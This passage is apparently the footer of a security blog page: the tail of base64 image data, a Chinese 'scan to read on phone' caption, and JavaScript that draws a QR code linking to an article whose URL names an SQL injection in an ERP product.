a220e5i6e57PNM73TP/gUa9odJ8jT7hHvHzeh60nfQuvNyS3/SK4DKSm82g8cva5172aeONh+wSFP8LUFh7pI1eeBL0HjfFFLwxHe2gMf4RVV3GkhSu9gu7HistAYr7wuTewGwjrtNiu/+SodK+xB83ROGq1rqcoUfkYdA17HH1n67nvnB/V3fOwPwc2bXD7VUvI9BtxN5CYL3zODVwDec69n+76IwOhX8Xx1aO57Bwt+YizlpzuwYrRgvf6RGOtZ7tOH5pPzW8i53v9yEB+8/D/tt4/MpD5KcPuHrH5hlaGuS55aRXJR2Tfp7wVHGupL08iHNsaOmf9dU28qb2H8QbveaOx7vkjA0njC//8BnYDyWSP8LPtxpp46eknHz20Fi6eIK2z4uxNXpi6WlckDxaXoHseafFEewTnGrp/+CNM31HbDSSmC59zA8tA6InyOZ4dlbV2nHqtj2qKrzjSiittDnqP0h8NuoYV577pxeqh19FmHHvQXhpnb+W0xhZLSywDCXHhc2/gGshz73+3+38BAAD//9ApbboAAAAGSURBVAMAG7q9jEzW38gAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 